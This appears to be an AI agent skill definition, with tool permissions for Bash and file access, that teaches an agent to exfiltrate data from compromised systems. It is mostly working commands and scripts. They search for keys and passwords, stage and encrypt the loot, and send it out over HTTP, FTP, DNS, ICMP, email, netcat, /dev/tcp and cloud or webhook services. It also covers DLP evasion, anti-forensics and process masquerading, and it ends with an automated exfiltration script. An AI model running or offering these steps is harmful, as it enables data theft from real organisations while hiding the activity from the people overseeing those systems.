---
name: data-exfiltration
description: Advanced data exfiltration techniques including compression, encoding, covert channels, and anti-DLP evasion methods
allowed-tools: Bash, Read, Write, Grep
---

# Data Exfiltration Skill

## Purpose
Provides comprehensive data exfiltration techniques for securely extracting data from compromised systems while evading detection, including compression, encoding, covert channels, and DLP bypass methods.

## Data Preparation

### File Discovery and Collection
```bash
# Find valuable files
find / -name "*.pdf" -o -name "*.doc*" -o -name "*.xls*" 2>/dev/null
find / -name "*.sql" -o -name "*.db" -o -name "*.sqlite" 2>/dev/null
find / -name "*.key" -o -name "*.pem" -o -name "*.pfx" 2>/dev/null
find / -name "*password*" -o -name "*secret*" 2>/dev/null

# Create staging directory
mkdir -p /tmp/.data/{docs,databases,configs,credentials}

# Organize collected data
cp important_files /tmp/.data/
```

### Data Compression
```bash
# Standard compression
tar -czf data.tar.gz /tmp/.data/
zip -r -9 -P password data.zip /tmp/.data/
7z a -p{password} -mhe data.7z /tmp/.data/

# Split large files
split -b 10M data.tar.gz data.part
cat data.part* > data.tar.gz  # Reassemble

# Compression with encryption
tar -czf - /tmp/.data/ | openssl enc -aes-256-cbc -salt -pass pass:Password123 -out data.enc
gpg --symmetric --cipher-algo AES256 data.tar.gz
```

### Data Encoding
```bash
# Base64 encoding
base64 data.tar.gz > data.b64
base64 -d data.b64 > data.tar.gz

# Hex encoding
xxd -p data.tar.gz > data.hex
xxd -r -p data.hex > data.tar.gz

# URL encoding
python3 -c "import urllib.parse; print(urllib.parse.quote(open('data.tar.gz','rb').read()))"

# Custom encoding
# XOR with key
python3 -c "
data = open('file.txt','rb').read()
key = b'secret'
encoded = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
open('encoded.txt','wb').write(encoded)
"
```

## Standard Exfiltration Methods

### HTTP/HTTPS Upload
```bash
# Simple HTTP POST
curl -X POST -F "file=@data.tar.gz" http://attacker.com/upload

# With authentication
curl -X POST -H "Authorization: Bearer {token}" \
  -F "file=@data.tar.gz" https://attacker.com/upload

# Chunked upload
split -b 1M data.tar.gz chunk_
for file in chunk_*; do
  curl -X POST -F "chunk=@$file" http://attacker.com/upload
done

# Using wget
wget --post-file=data.tar.gz http://attacker.com/upload
```

### FTP/SFTP Transfer
```bash
# FTP upload
ftp -n attacker.com << EOF
user anonymous anonymous@
binary
put data.tar.gz
quit
EOF

# SFTP
sftp user@attacker.com:/path/ <<< $'put data.tar.gz'

# Using Python
python3 -c "
import ftplib
ftp = ftplib.FTP('attacker.com')
ftp.login('user', 'pass')
ftp.storbinary('STOR data.tar.gz', open('data.tar.gz', 'rb'))
ftp.quit()
"
```

### Cloud Storage Upload
```bash
# AWS S3
aws s3 cp data.tar.gz s3://bucket/data.tar.gz --no-sign-request
aws s3 sync /tmp/.data/ s3://bucket/exfil/

# Google Drive
gdrive upload data.tar.gz

# Dropbox
curl -X POST https://content.dropboxapi.com/2/files/upload \
  -H "Authorization: Bearer {token}" \
  -H "Dropbox-API-Arg: {\"path\": \"/data.tar.gz\"}" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @data.tar.gz

# OneDrive
curl -X PUT "https://graph.microsoft.com/v1.0/me/drive/root:/data.tar.gz:/content" \
  -H "Authorization: Bearer {token}" \
  --data-binary @data.tar.gz
```

## Covert Channel Exfiltration

### DNS Exfiltration
```bash
# DNS tunneling with dnscat2
# Server side
dnscat2 --secret=password

# Client side
./dnscat2 --secret=password {attacker_domain}

# Manual DNS exfil
for chunk in $(base64 data.tar.gz | fold -w32); do
  nslookup $chunk.attacker.com
done

# Using iodine
# Server
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# Client
iodine -f -P password tunnel.attacker.com
```

### ICMP Exfiltration
```bash
# Using ICMPdoor
# Sender
./icmpdoor -i eth0 -d attacker.com -f data.tar.gz

# Using hping3
for byte in $(xxd -p data.tar.gz); do
  hping3 -1 -E /dev/stdin -d ${#byte} attacker.com <<< $byte
done

# Python ICMP exfil
python3 -c "
import socket
import struct

def send_icmp_data(host, data):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + data
    s.sendto(packet, (host, 0))

with open('data.tar.gz', 'rb') as f:
    while True:
        chunk = f.read(32)
        if not chunk:
            break
        send_icmp_data('attacker.com', chunk)
"
```

### HTTPS Covert Channels
```bash
# Hide data in HTTP headers
curl -H "Cookie: $(base64 -w0 data.txt)" http://attacker.com
curl -H "User-Agent: Mozilla/5.0 $(base64 -w0 data.txt)" http://attacker.com

# Hide in POST parameters
curl -X POST http://attacker.com/api \
  -d "normal_param=value&debug=$(base64 -w0 data.txt)"

# Timing-based exfil
for bit in $(xxd -b data.txt | cut -d' ' -f2-7 | tr -d ' \n'); do
  if [ "$bit" = "1" ]; then
    sleep 2
  else
    sleep 1
  fi
  curl http://attacker.com/beacon
done
```

### Email Exfiltration
```bash
# Send via mail command
echo "Data attached" | mail -s "Report" -a data.tar.gz attacker@email.com

# Using Python
python3 -c "
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

msg = MIMEMultipart()
msg['From'] = 'sender@gmail.com'
msg['To'] = 'attacker@email.com'
msg['Subject'] = 'Report'

attachment = MIMEBase('application', 'octet-stream')
attachment.set_payload(open('data.tar.gz', 'rb').read())
encoders.encode_base64(attachment)
attachment.add_header('Content-Disposition', 'attachment; filename=data.tar.gz')
msg.attach(attachment)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login('sender@gmail.com', 'password')
server.send_message(msg)
server.quit()
"
```

## Anti-DLP Techniques

### File Type Obfuscation
```bash
# Change file extensions
mv data.tar.gz report.docx
mv credentials.txt image.jpg

# Add file headers
echo -e "\xFF\xD8\xFF\xE0" | cat - data.tar.gz > image.jpg  # JPEG header
echo "GIF89a" | cat - data.tar.gz > image.gif  # GIF header

# Embed in legitimate files
# Hide in image (steganography)
steghide embed -cf cover.jpg -ef data.tar.gz -p password
steghide extract -sf cover.jpg -p password

# Hide in PDF
qpdf --stream-data=uncompress input.pdf output.pdf
echo "stream" >> output.pdf
cat data.tar.gz >> output.pdf
echo "endstream" >> output.pdf
```

### Traffic Masquerading
```bash
# Mimic legitimate traffic patterns
# Randomize timing
for chunk in chunk_*; do
  sleep $((RANDOM % 60))
  curl -X POST -F "file=@$chunk" http://attacker.com/upload
done

# Use legitimate services
# Pastebin
curl -d "api_dev_key={key}&api_paste_code=$(base64 data.tar.gz)" \
  https://pastebin.com/api/api_post.php

# GitHub Gist
curl -X POST https://api.github.com/gists \
  -H "Authorization: token {token}" \
  -d "{\"files\":{\"data.txt\":{\"content\":\"$(base64 data.tar.gz)\"}}}"

# Slack webhook
curl -X POST -H 'Content-type: application/json' \
  --data "{\"text\":\"$(base64 -w0 data.tar.gz)\"}" \
  https://hooks.slack.com/services/{webhook}
```

### Encryption and Obfuscation
```bash
# Multi-layer encryption
# Layer 1: Compress
tar -czf data.tar.gz /tmp/.data/
# Layer 2: Encrypt
gpg --cipher-algo AES256 --symmetric data.tar.gz
# Layer 3: Encode
base64 data.tar.gz.gpg > data.b64
# Layer 4: Split
split -b 100k data.b64 part_

# Custom obfuscation
python3 -c "
import base64
import zlib

# Compress, encrypt, encode
data = open('data.tar.gz', 'rb').read()
compressed = zlib.compress(data)
encoded = base64.b85encode(compressed)
obfuscated = bytes([b ^ 0x55 for b in encoded])
open('obfuscated.dat', 'wb').write(obfuscated)
"
```

## Living Off the Land (LOL) Exfiltration

### Windows Built-in Tools
```powershell
# BitsTransfer
Start-BitsTransfer -Source C:\data.zip -Destination http://attacker.com/upload

# Certutil
certutil -encode data.tar.gz data.b64
certutil -urlcache -f http://attacker.com/upload data.b64

# PowerShell web client
$client = New-Object System.Net.WebClient
$client.UploadFile("http://attacker.com/upload", "C:\data.zip")

# Using WMI
wmic process call create "cmd /c type data.txt > \\attacker.com\share\data.txt"
```

### Linux Built-in Tools
```bash
# Using netcat
nc attacker.com 4444 < data.tar.gz
tar -czf - /tmp/.data/ | nc attacker.com 4444

# Using /dev/tcp
exec 3<>/dev/tcp/attacker.com/4444
cat data.tar.gz >&3
exec 3>&-

# Using ssh
tar -czf - /tmp/.data/ | ssh user@attacker.com "cat > data.tar.gz"

# Using rsync
rsync -avz /tmp/.data/ user@attacker.com:/path/
```

## Physical Exfiltration

### USB Device
```bash
# Auto-copy to USB
#!/bin/bash
# Monitor for USB insertion
while true; do
  for dev in /media/*; do
    if [ -d "$dev" ]; then
      cp -r /tmp/.data/ "$dev/" 2>/dev/null
      sync
    fi
  done
  sleep 5
done

# Hide data on USB
# Create hidden partition
fdisk /dev/sdb  # Create hidden partition
dd if=data.tar.gz of=/dev/sdb2  # Write to hidden partition
```

### Network Printer
```bash
# Send to network printer (hide in print jobs)
lp -d printer_name data.txt
echo "data" | nc printer_ip 9100

# Encode in PostScript
echo "%!PS" > doc.ps
echo "% $(base64 data.tar.gz)" >> doc.ps
lp doc.ps
```

## Automated Exfiltration Script
```bash
#!/bin/bash
# Automated multi-method exfiltration

DATA_DIR="/tmp/.data"
STAGING="/tmp/.staging"
TARGET="http://attacker.com"

# Prepare data
prepare_data() {
  mkdir -p $STAGING
  tar -czf $STAGING/data.tar.gz $DATA_DIR

  # Encrypt
  openssl enc -aes-256-cbc -salt -in $STAGING/data.tar.gz \
    -out $STAGING/data.enc -pass pass:Password123

  # Encode
  base64 $STAGING/data.enc > $STAGING/data.b64

  # Split
  split -b 500k $STAGING/data.b64 $STAGING/chunk_
}

# Try multiple exfil methods
exfiltrate() {
  # Method 1: HTTP
  for chunk in $STAGING/chunk_*; do
    curl -X POST -F "file=@$chunk" $TARGET/upload && rm $chunk
    sleep $((RANDOM % 30))
  done

  # Method 2: DNS (fallback)
  if ls $STAGING/chunk_* 2>/dev/null; then
    for chunk in $STAGING/chunk_*; do
      data=$(base64 -w32 $chunk)
      for line in $data; do
        nslookup $line.data.attacker.com
      done
    done
  fi

  # Cleanup
  rm -rf $STAGING
}

prepare_data
exfiltrate
```

## Detection Evasion

### Anti-Forensics
```bash
# Clear traces
history -c
cat /dev/null > ~/.bash_history
shred -vfz data.tar.gz
rm -rf /tmp/.data /tmp/.staging

# Timestomping
touch -t 202301011200 data.tar.gz
touch -r /etc/passwd data.tar.gz

# Hide processes
cp /bin/bash /tmp/.systemd
exec -a "[kworker/0:1]" /tmp/.systemd
```

### DLP Bypass Strategies
1. **Fragment data** into small pieces
2. **Use encryption** to hide content
3. **Leverage allowed services** (cloud storage, code repos)
4. **Mimic normal traffic** patterns
5. **Use multiple channels** simultaneously
6. **Implement delays** between transfers
7. **Obfuscate file types** and names

## Best Practices

1. **Always encrypt sensitive data** before exfiltration
2. **Use multiple small transfers** instead of one large
3. **Implement redundancy** with multiple channels
4. **Monitor for detection** during exfiltration
5. **Clean up traces** after successful transfer
6. **Test channels first** with benign data
7. **Document what was taken** for reporting

## Integration Notes

- Coordinates with credential-harvesting for password/key collection
- Uses persistence-techniques to maintain exfil capability
- Leverages evasion-techniques to avoid detection
- Works with network-pivoting for multi-hop exfiltration